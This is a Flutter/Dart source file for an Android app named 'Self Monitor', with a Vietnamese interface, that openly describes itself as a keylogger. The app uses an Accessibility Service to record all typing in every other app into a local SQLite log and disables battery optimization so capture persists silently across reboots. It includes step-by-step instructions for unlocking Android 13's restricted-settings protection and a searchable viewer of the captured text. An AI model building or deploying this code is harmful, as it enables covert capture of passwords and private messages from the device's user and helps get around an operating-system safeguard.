import 'dart:async';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'db_helper.dart';
import 'monitor_service.dart';

void main() {
  runApp(const SelfMonitorApp());
}

class SelfMonitorApp extends StatelessWidget {
  const SelfMonitorApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Self Monitor',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorSchemeSeed: Colors.indigo,
        useMaterial3: true,
      ),
      home: const HomeScreen(),
    );
  }
}

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
  bool _accessibilityEnabled = false;
  bool _batteryOptIgnored = false;
  bool _checking = true;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _refreshStatus();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _refreshStatus();
    }
  }

  Future<void> _refreshStatus() async {
    setState(() => _checking = true);
    final accEnabled = await MonitorService.isAccessibilityServiceEnabled();
    final batteryIgnored = await MonitorService.isIgnoringBatteryOptimizations();

    if (mounted) {
      setState(() {
        _accessibilityEnabled = accEnabled;
        _batteryOptIgnored = batteryIgnored;
        _checking = false;
      });
    }
  }

  Future<void> _toggleAccessibility() async {
    await MonitorService.openAccessibilitySettings();
    await Future.delayed(const Duration(milliseconds: 600));
    _refreshStatus();
  }

  Future<void> _requestBatteryOptimization() async {
    await MonitorService.requestIgnoreBatteryOptimizations();
    await Future.delayed(const Duration(milliseconds: 600));
    _refreshStatus();
  }

  void _showAndroid13Guide() {
    showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Text('Lưu ý mở khoá quyền trên Android 13+'),
        content: const SingleChildScrollView(
          child: Text(
            'Nếu mục Accessibility bị mờ và hệ thống báo "Cài đặt bị hạn chế (Restricted settings)":\n\n'
            '1. Vào Cài đặt máy > Ứng dụng > Tìm "Self Monitor"\n'
            '2. Nhấn vào biểu tượng 3 dấu chấm ở góc trên cùng bên phải màn hình\n'
            '3. Chọn "Cho phép cài đặt bị hạn chế" (Allow restricted settings)\n'
            '4. Nhập mật khẩu/vân tay mở khoá máy\n'
            '5. Quay lại app và bật quyền Accessibility bình thường.',
            style: TextStyle(fontSize: 14, height: 1.4),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx),
            child: const Text('Đã hiểu'),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Self Monitor'),
        actions: [
          IconButton(
            icon: const Icon(Icons.refresh),
            tooltip: 'Làm mới trạng thái',
            onPressed: _refreshStatus,
          ),
        ],
      ),
      body: _checking
          ? const Center(child: CircularProgressIndicator())
          : RefreshIndicator(
              onRefresh: _refreshStatus,
              child: ListView(
                padding: const EdgeInsets.all(16),
                children: [
                  if (!MonitorService.isAndroid)
                    Container(
                      margin: const EdgeInsets.only(bottom: 16),
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        color: Colors.amber.shade100,
                        borderRadius: BorderRadius.circular(8),
                        border: Border.all(color: Colors.amber.shade400),
                      ),
                      child: Row(
                        children: [
                          Icon(Icons.warning_amber_rounded,
                              color: Colors.amber.shade900),
                          const SizedBox(width: 10),
                          Expanded(
                            child: Text(
                              'Ứng dụng đang chạy trên ${Platform.operatingSystem}. Tính năng Accessibility chỉ hoạt động trên thiết bị Android.',
                              style: TextStyle(
                                  color: Colors.amber.shade900,
                                  fontSize: 13,
                                  fontWeight: FontWeight.w500),
                            ),
                          ),
                        ],
                      ),
                    ),

                  // Banner trạng thái chạy ngầm 100%
                  Container(
                    margin: const EdgeInsets.only(bottom: 16),
                    padding: const EdgeInsets.all(14),
                    decoration: BoxDecoration(
                      color: _accessibilityEnabled
                          ? Colors.green.shade50
                          : Colors.blue.shade50,
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(
                        color: _accessibilityEnabled
                            ? Colors.green.shade300
                            : Colors.blue.shade300,
                      ),
                    ),
                    child: Row(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Icon(
                          _accessibilityEnabled
                              ? Icons.verified
                              : Icons.info_outline,
                          color: _accessibilityEnabled
                              ? Colors.green.shade700
                              : Colors.blue.shade700,
                        ),
                        const SizedBox(width: 10),
                        Expanded(
                          child: Text(
                            _accessibilityEnabled
                                ? 'Dịch vụ đang CHẠY NGẦM 100% hoàn toàn tự động. Bạn không cần mở app, kể cả khi khởi động lại máy hệ thống vẫn tự động ghi phím ngầm.'
                                : 'Chỉ cần cấp quyền 1 lần duy nhất, sau đó bạn không cần mở app, hệ thống sẽ tự động chạy ngầm mãi mãi.',
                            style: TextStyle(
                              color: _accessibilityEnabled
                                  ? Colors.green.shade900
                                  : Colors.blue.shade900,
                              fontSize: 13,
                              fontWeight: FontWeight.w500,
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),

                  // Card 1: Chạy ngầm liên tục
                  _buildStatusCard(
                    title: 'Chạy ngầm liên tục (Không bị hệ thống tắt)',
                    subtitle:
                        'Tắt tối ưu hoá pin (Battery Optimization) để dịch vụ ghi phím không bị Android đóng băng khi bạn tắt app hoặc khoá màn hình.',
                    enabled: _batteryOptIgnored,
                    onToggle: _requestBatteryOptimization,
                    toggleLabel: _batteryOptIgnored
                        ? 'Đã bật chạy ngầm liên tục'
                        : 'Cấp quyền chạy ngầm không bị tắt',
                    color: Colors.teal,
                  ),
                  const SizedBox(height: 16),

                  // Card 2: Accessibility ghi phím
                  _buildStatusCard(
                    title: 'Ghi lại thao tác nhập liệu (Keylogger)',
                    subtitle:
                        'Sử dụng Accessibility Service để tự động ghi lại toàn bộ thao tác gõ phím trên tất cả các app khác vào SQLite local.',
                    enabled: _accessibilityEnabled,
                    onToggle: _toggleAccessibility,
                    toggleLabel: _accessibilityEnabled
                        ? 'Mở cài đặt Accessibility'
                        : 'Cấp quyền Accessibility',
                    trailingAction: TextButton.icon(
                      onPressed: _showAndroid13Guide,
                      icon: const Icon(Icons.help_outline, size: 16),
                      label: const Text('Bị khoá quyền? (Android 13+)'),
                    ),
                  ),
                  const SizedBox(height: 24),

                  ElevatedButton.icon(
                    onPressed: () {
                      Navigator.of(context).push(
                        MaterialPageRoute(
                            builder: (_) => const TimelineScreen()),
                      );
                    },
                    icon: const Icon(Icons.history),
                    label: const Text('Xem lịch sử gõ phím đã ghi'),
                    style: ElevatedButton.styleFrom(
                      padding: const EdgeInsets.symmetric(vertical: 14),
                    ),
                  ),
                  const SizedBox(height: 10),
                  OutlinedButton.icon(
                    onPressed: () async {
                      final confirm = await showDialog<bool>(
                        context: context,
                        builder: (ctx) => AlertDialog(
                          title: const Text('Xoá toàn bộ log?'),
                          content: const Text(
                              'Thao tác này sẽ xoá sạch toàn bộ text log đã lưu.'),
                          actions: [
                            TextButton(
                                onPressed: () => Navigator.pop(ctx, false),
                                child: const Text('Huỷ')),
                            TextButton(
                                onPressed: () => Navigator.pop(ctx, true),
                                child: const Text('Xoá sạch')),
                          ],
                        ),
                      );
                      if (confirm == true) {
                        await DbHelper.instance.clearAll();
                        if (context.mounted) {
                          ScaffoldMessenger.of(context).showSnackBar(
                            const SnackBar(content: Text('Đã xoá sạch log')),
                          );
                        }
                      }
                    },
                    icon: const Icon(Icons.delete_outline),
                    label: const Text('Xoá sạch toàn bộ log'),
                  ),
                ],
              ),
            ),
    );
  }

  Widget _buildStatusCard({
    required String title,
    required String subtitle,
    required bool enabled,
    required VoidCallback onToggle,
    required String toggleLabel,
    Color? color,
    Widget? trailingAction,
  }) {
    return Card(
      elevation: 1,
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Icon(
                  enabled ? Icons.check_circle : Icons.circle_outlined,
                  color: enabled ? (color ?? Colors.green) : Colors.grey,
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: Text(title,
                      style: const TextStyle(
                          fontSize: 16, fontWeight: FontWeight.bold)),
                ),
              ],
            ),
            const SizedBox(height: 8),
            Text(subtitle, style: TextStyle(color: Colors.grey[700])),
            if (trailingAction != null) ...[
              const SizedBox(height: 4),
              trailingAction,
            ],
            const SizedBox(height: 12),
            SizedBox(
              width: double.infinity,
              child: FilledButton(
                onPressed: onToggle,
                child: Text(toggleLabel),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class TimelineScreen extends StatefulWidget {
  const TimelineScreen({super.key});

  @override
  State<TimelineScreen> createState() => _TimelineScreenState();
}

class _TimelineScreenState extends State<TimelineScreen> {
  List<Map<String, dynamic>> _textLogs = [];
  Timer? _autoRefreshTimer;
  bool _isLoading = false;
  String _searchQuery = '';

  @override
  void initState() {
    super.initState();
    _load();
    // Tự động cập nhật mỗi 3 giây
    _autoRefreshTimer =
        Timer.periodic(const Duration(seconds: 3), (_) => _load(silent: true));
  }

  @override
  void dispose() {
    _autoRefreshTimer?.cancel();
    super.dispose();
  }

  Future<void> _load({bool silent = false}) async {
    if (!silent) {
      setState(() => _isLoading = true);
    }
    final texts = await DbHelper.instance.getTextLogs();
    if (mounted) {
      setState(() {
        _textLogs = texts;
        _isLoading = false;
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    final filteredLogs = _searchQuery.isEmpty
        ? _textLogs
        : _textLogs.where((log) {
            final content = (log['content'] ?? '').toString().toLowerCase();
            final pkg = (log['package_name'] ?? '').toString().toLowerCase();
            final q = _searchQuery.toLowerCase();
            return content.contains(q) || pkg.contains(q);
          }).toList();

    return Scaffold(
      appBar: AppBar(
        title: Text('Lịch sử đã ghi (${_textLogs.length})'),
        actions: [
          IconButton(
            icon: const Icon(Icons.refresh),
            tooltip: 'Làm mới',
            onPressed: () => _load(silent: false),
          ),
        ],
      ),
      body: Column(
        children: [
          // Search Bar
          Padding(
            padding: const EdgeInsets.fromLTRB(16, 8, 16, 8),
            child: TextField(
              decoration: InputDecoration(
                hintText: 'Tìm kiếm nội dung hoặc tên app...',
                prefixIcon: const Icon(Icons.search),
                isDense: true,
                filled: true,
                fillColor: Colors.grey.shade100,
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(10),
                  borderSide: BorderSide.none,
                ),
              ),
              onChanged: (val) {
                setState(() => _searchQuery = val.trim());
              },
            ),
          ),

          Expanded(
            child: _isLoading && _textLogs.isEmpty
                ? const Center(child: CircularProgressIndicator())
                : RefreshIndicator(
                    onRefresh: () => _load(silent: false),
                    child: filteredLogs.isEmpty
                        ? ListView(
                            children: [
                              const SizedBox(height: 120),
                              Icon(Icons.notes,
                                  size: 64, color: Colors.grey.shade400),
                              const SizedBox(height: 16),
                              Center(
                                child: Text(
                                  _searchQuery.isNotEmpty
                                      ? 'Không tìm thấy kết quả phù hợp'
                                      : 'Chưa có dữ liệu gõ phím nào.',
                                  style: const TextStyle(
                                      fontSize: 16,
                                      fontWeight: FontWeight.bold),
                                ),
                              ),
                              const SizedBox(height: 8),
                              Padding(
                                padding:
                                    const EdgeInsets.symmetric(horizontal: 32),
                                child: Text(
                                  _searchQuery.isNotEmpty
                                      ? 'Thử tìm kiếm với từ khoá khác.'
                                      : 'Hãy đảm bảo bạn đã BẬT quyền Accessibility cho Self Monitor, sau đó mở ứng dụng khác (Note, Chrome, Zalo...) và gõ chữ thử nghiệm.',
                                  textAlign: TextAlign.center,
                                  style: const TextStyle(color: Colors.grey),
                                ),
                              ),
                            ],
                          )
                        : ListView.separated(
                            itemCount: filteredLogs.length,
                            separatorBuilder: (context, index) =>
                                const Divider(height: 1),
                            itemBuilder: (ctx, i) {
                              final item = filteredLogs[i];
                              final time = item['timestamp'] ?? '';
                              final pkg = item['package_name'] ?? '';
                              final content = item['content'] ?? '';

                              return ListTile(
                                leading: CircleAvatar(
                                  backgroundColor: Colors.indigo.shade50,
                                  child: const Icon(Icons.text_snippet,
                                      color: Colors.indigo),
                                ),
                                title: SelectableText(
                                  content,
                                  style: const TextStyle(
                                      fontWeight: FontWeight.w600),
                                ),
                                subtitle: Text('$pkg • $time',
                                    style: const TextStyle(fontSize: 12)),
                                trailing: IconButton(
                                  icon: const Icon(Icons.copy, size: 18),
                                  tooltip: 'Sao chép nội dung',
                                  onPressed: () {
                                    Clipboard.setData(
                                        ClipboardData(text: content));
                                    ScaffoldMessenger.of(context).showSnackBar(
                                      const SnackBar(
                                        content: Text('Đã sao chép vào bộ nhớ tạm'),
                                        duration: Duration(seconds: 1),
                                      ),
                                    );
                                  },
                                ),
                              );
                            },
                          ),
                  ),
          ),
        ],
      ),
    );
  }
}
